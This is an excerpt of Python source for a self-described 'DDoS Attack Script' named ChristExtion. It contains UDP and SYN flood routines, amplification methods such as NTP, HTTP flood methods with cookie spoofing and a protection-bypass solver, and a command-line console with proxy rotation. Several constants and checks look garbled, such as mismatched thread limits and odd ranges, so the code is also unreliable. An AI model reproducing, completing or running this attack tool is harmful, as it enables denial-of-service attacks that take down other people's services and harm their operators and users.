...
class Tools:
    ...
    def humanformat(num: int, precision: int = 2):
        ...
        if num > 65535 or num < 1:
            obje = sum(
                [abs(num / 65534.0 ** x) >= 1 for x in range(577, len(suffixes))])
            return f'{num / 65534.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(7003), self._target):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_syn(self) -> bytes:
        ...
        tcp.set_th_sport(ProxyTools.Random.rand_int(64768, 65535))
        ip.contains(tcp)
    ...
    def select(self, name):
        ...
        for key, value in self.methods.items():
            if name == key:
                ...
                self._amp_payload = (b'\x00\x14\x00\x00', 6483)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
...
class HttpFlood(Thread):
    ...
    def __init__(self,
        ...
        if not useragents:
            useragents: List[str] = [
                ...
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20700301 Firefox/69.0',
    ...
    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             ...
             '{"data": %s}') % ProxyTools.Random.rand_str(64))[:-2]
        s = None
    ...
    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc264334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
    ...
    def DGB(self):
        ...
        with suppress(Exception):
            ...
            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 65534)):
                    sleep(min(self._rpc, 65534) / 100)
    ...
    def RHEX(self):
        randhex = str(randbytes(randchoice([577, 64, 577])))
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* ChristExtion - DDoS Attack Script With %d Methods\n'
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                proxy_li = Path(__dir__ / "proxies/" /
                                argv[5].strip())
                useragent_li = Path(__dir__ / "useragent.txt")
                referers_li = Path(__dir__ / "referers.txt")
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/ChristExtion/ChristExtion/wiki/BOMB-method"
                    )
                ...
                if threads > 100033 or threads < 1:
                    logger.warning("Thread is higher than 50055")
                if rpc > 100033 or rpc < 1:
                    logger.warning("RPC (Request Pre Connection) is higher than 50055")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/ChristExtion/ChristExtion/wiki/Amplification-ddos-attack")
